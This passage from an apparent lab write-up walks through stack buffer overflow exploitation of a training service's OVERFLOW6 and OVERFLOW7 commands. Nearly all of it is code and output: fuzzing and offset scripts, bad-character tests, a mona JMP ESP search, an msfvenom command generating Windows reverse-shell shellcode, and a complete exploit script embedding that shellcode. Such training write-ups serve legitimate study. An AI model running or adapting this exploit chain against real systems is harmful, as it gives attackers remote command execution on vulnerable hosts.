class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-6"><a class="markdownIt-Anchor" href="#badchar-6"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW6 &quot;</span></span><br><span class="line">offset = <span class="number">1034</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\x08\x09\x2c\x2d\xad\xae</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW6 &quot;</span></span><br><span class="line">offset = <span class="number">1034</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2b\x2d\x2e\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xac\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfc\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\x08\x2c\xad</code>之后<code>\x09\x2d\xae</code>不受影响</p><p>BADCHAR: <code>\x00\x08\x2c\xad</code></p><h3 id="jmp-esp-6"><a class="markdownIt-Anchor" href="#jmp-esp-6"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\x08\x2c\xad&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-6"><a class="markdownIt-Anchor" href="#shellcode-6"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\x08\x2c\xad&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-6"><a class="markdownIt-Anchor" href="#exploit-6"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW6 &quot;</span></span><br><span class="line">offset = <span class="number">1034</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\xbf\x69\x34\x2f\xb4\xdb\xdd\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\xa9\x30\xcd\x41\xd5\xd1\x93\xaa\x25\x22\xf4\x23\xc0\x13\x34\x57\x81\x04\x84\x13\xc7\xa8\x6f\x71\xf3\x3b\x1d\x5e\xf4\x8c\xa8\xb8\x3b\x0c\x80\xf9\x5a\x8e\xdb\x2d\xbc\xaf\x13\x20\xbd\xe8\x4e\xc9\xef\xa1\x05\x7c\x1f\xc5\x50\xbd\x94\x95\x75\xc5\x49\x6d\x77\xe4\xdc\xe5\x2e\x26\xdf\x2a\x5b\x6f\xc7\x2f\x66\x39\x7c\x9b\x1c\xb8\x54\xd5\xdd\x17\x99\xd9\x2f\x69\xde\xde\xcf\x1c\x16\x1d\x6d\x27\xed\x5f\xa9\xa2\xf5\xf8\x3a\x14\xd1\xf9\xef\xc3\x92\xf6\x44\x87\xfc\x1a\x5a\x44\x77\x26\xd7\x6b\x57\xae\xa3\x4f\x73\xea\x70\xf1\x22\x56\xd6\x0e\x34\x39\x87\xaa\x3f\xd4\xdc\xc6\x62\xb1\x11\xeb\x9c\x41\x3e\x7c\xef\x73\xe1\xd6\x67\x38\x6a\xf1\x70\x3f\x41\x45\xee\xbe\x6a\xb6\x27\x05\x3e\xe6\x5f\xac\x3f\x6d\x9f\x51\xea\x22\xcf\xfd\x45\x83\xbf\xbd\x35\x6b\xd5\x31\x69\x8b\xd6\x9b\x02\x26\x2d\x4c\x27\xa6\x07\xec\x5f\xca\x57\xe9\xa6\x43\xb1\x9b\xc8\x05\x6a\x34\x70\x0c\xe0\xa5\x7d\x9a\x8d\xe6\xf6\x29\x72\xa8\xfe\x44\x60\x5d\x0f\x13\xda\xc8\x10\x89\x72\x96\x83\x56\x82\xd1\xbf\xc0\xd5\xb6\x0e\x19\xb3\x2a\x28\xb3\xa1\xb6\xac\xfc\x61\x6d\x0d\x02\x68\xe0\x29\x20\x7a\x3c\xb1\x6c\x2e\x90\xe4\x3a\x98\x56\x5f\x8d\x72\x01\x0c\x47\x12\xd4\x7e\x58\x64\xd9\xaa\x2e\x88\x68\x03\x77\xb7\x45\xc3\x7f\xc0\xbb\x73\x7f\x1b\x78\x83\xca\x01\x29\x0c\x93\xd0\x6b\x51\x24\x0f\xaf\x6c\xa7\xa5\x50\x8b\xb7\xcc\x55\xd7\x7f\x3d\x24\x48\xea\x41\x9b\x69\x3f&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="overflow7"><a class="markdownIt-Anchor" href="#overflow7"></a> OVERFLOW7</h2><h3 id="fuzz-7"><a class="markdownIt-Anchor" href="#fuzz-7"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW7 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 1400 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-7"><a class="markdownIt-Anchor" href="#offset-7"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1400</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW7 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 72423572 -&gt; rB5r -&gt; r5Br</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q r5Br -l 1400</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 1306</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW7 &quot;</span></span><br><span class="line">offset = <span class="number">1306</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-7"><a class="markdownIt-Anchor" href="#badchar-7"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW7 &quot;</span></span><br><span class="line">offset = <span class="number">1306</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span 